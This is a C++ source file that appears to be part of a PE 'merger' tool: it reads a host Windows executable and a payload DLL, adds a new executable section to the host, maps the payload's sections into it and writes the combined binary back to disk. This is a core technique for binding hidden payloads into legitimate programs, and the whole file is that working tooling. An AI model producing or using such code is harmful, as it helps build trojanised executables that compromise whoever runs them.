#include "./merge.hpp"

#include <windows.h>
#include <winnt.h>
#include <fstream>

namespace merger
{

void merge( const std::string& host, const std::string& payload )
{
	// read the files into memory
	std::fstream fhost( host, std::ios::binary | std::ios::ate | std::ios::in | std::ios::out );
	std::fstream fpayload( payload, std::ios::binary | std::ios::ate | std::ios::in );

	const std::streamsize host_file_size = fhost.tellg();
	const std::streamsize payload_file_size = fpayload.tellg();

	fhost.seekg( 0, std::ios::beg );
	fpayload.seekg( 0, std::ios::beg );

	char* host_memory = static_cast<char*>(operator new(host_file_size));
	char* payload_memory = static_cast<char*>(operator new(payload_file_size));

	fhost.read( host_memory, host_file_size );
	fpayload.read( payload_memory, payload_file_size );

	// dos header
	const auto host_dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(host_memory);
	const auto payload_dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(payload_memory);

	// nt headers (32 & 64)
	const auto host_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS32*>(host_memory + host_dos_header->e_lfanew);
	const auto payload_nt_headers = reinterpret_cast<IMAGE_NT_HEADERS64*>(payload_memory + payload_dos_header->e_lfanew);

	// file header
	IMAGE_FILE_HEADER* host_file_header = &(host_nt_headers->FileHeader);
	IMAGE_FILE_HEADER* payload_file_header = &(payload_nt_headers->FileHeader);

	// optional header (32 & 64)
	IMAGE_OPTIONAL_HEADER32* host_optional_header = &(host_nt_headers->OptionalHeader);
	IMAGE_OPTIONAL_HEADER64* payload_optional_header = &(payload_nt_headers->OptionalHeader);

	// get "null" section of host (last section + 1)
	const auto host_last_section_header = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<char*>(host_optional_header) + host_file_header->SizeOfOptionalHeader) + host_file_header->NumberOfSections - 1;
	IMAGE_SECTION_HEADER* host_null_section_header = host_last_section_header + 1;

	// the payload dll has to be mapped virtually (tbh, would be better static but we use virtual addresses, cba to fix), so we get its imagesize
	const DWORD payload_virtual_memory_size = payload_optional_header->SizeOfImage;

	// set the size of our new section
	host_null_section_header->Misc.VirtualSize = payload_virtual_memory_size;
	host_null_section_header->SizeOfRawData = payload_virtual_memory_size;

	// file position
	host_null_section_header->PointerToRawData = host_last_section_header->PointerToRawData + host_last_section_header->SizeOfRawData;

	// virtual address must be aligned by OptionalHeader->SectionAlignment, so we align it
	const DWORD section_alignment = host_optional_header->SectionAlignment;

	host_null_section_header->VirtualAddress = (host_last_section_header->VirtualAddress + host_last_section_header->SizeOfRawData + (section_alignment - 1)) & ~(section_alignment - 1);

	// mark as executable
	host_null_section_header->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

	// "register" our section
	host_file_header->NumberOfSections++;

	// increase host's SizeOfImage so that it can run
	host_optional_header->SizeOfImage += payload_virtual_memory_size;

	// allocate map memory
	char* payload_virtual_memory = static_cast<char*>(operator new(payload_virtual_memory_size));

	// zero it out (probably not necessary...)
	std::memset( payload_virtual_memory, NULL, payload_virtual_memory_size );

	// start writing sections
	auto payload_current_section_header = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<char*>(payload_optional_header) + payload_file_header->SizeOfOptionalHeader);

	for ( int index = 0; index < payload_file_header->NumberOfSections; index++, payload_current_section_header++ )
	{
		std::memcpy( payload_virtual_memory + payload_current_section_header->VirtualAddress, payload_memory + payload_current_section_header->PointerToRawData, payload_current_section_header->SizeOfRawData );
	}

	// at this point, payload_current_section_header is at the last section, so we can get the size of the pe header and copy it
	const size_t size_of_pe_header = reinterpret_cast<char*>(payload_current_section_header) - payload_memory;

	std::memcpy( payload_virtual_memory, payload_memory, size_of_pe_header );

	// reset fhost cursor pos
	fhost.seekg( 0, std::ios::beg );

	// write host memory back to disk
	fhost.write( host_memory, host_file_size );

	// write payload memory back to disk
	fhost.write( payload_virtual_memory, payload_virtual_memory_size );

	// close file handles
	fhost.close();
	fpayload.close();

	// free memory (cba to use smart pointers...)
	operator delete(host_memory);
	operator delete(payload_memory);
	operator delete(payload_virtual_memory);

	// done!
}

} // namespace merger